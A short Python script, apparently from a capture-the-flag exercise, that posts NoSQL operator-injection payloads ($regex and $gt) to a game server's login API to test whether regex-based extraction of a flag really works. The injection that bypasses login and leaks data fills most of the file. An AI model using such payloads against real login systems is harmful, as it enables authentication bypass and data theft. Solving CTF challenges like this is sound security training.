import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# Let's test if we can extract more of the username since earlier we got up to:
# SK-CERT{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

import string

# wait, was the flag really "SK-CERT{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"?
# let's test if it actually was correct, or if ".*" matched anything!
# ah, the `$` was missing from the regex in my test, so "^SK-CERT{aaaa.*" matches "SK-CERT{something}" if "a" is just part of it? No, `^SK-CERT{aaaa.*` means it must START with `SK-CERT{aaaa`. So if the actual flag is `SK-CERT{someting}`, it should NOT match `^SK-CERT{aaaa`.
# BUT maybe the NoSQL injection wasn't actually working as a regex!
# What if it's evaluating `{"$regex": ...}` as truthy for some reason?
# Let's test:
payload = {"username": {"$regex": "^SK-CERT{NONEXISTENT_FLAG_1234}.*"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("Nonexistent SK-CERT flag:", r.status_code)
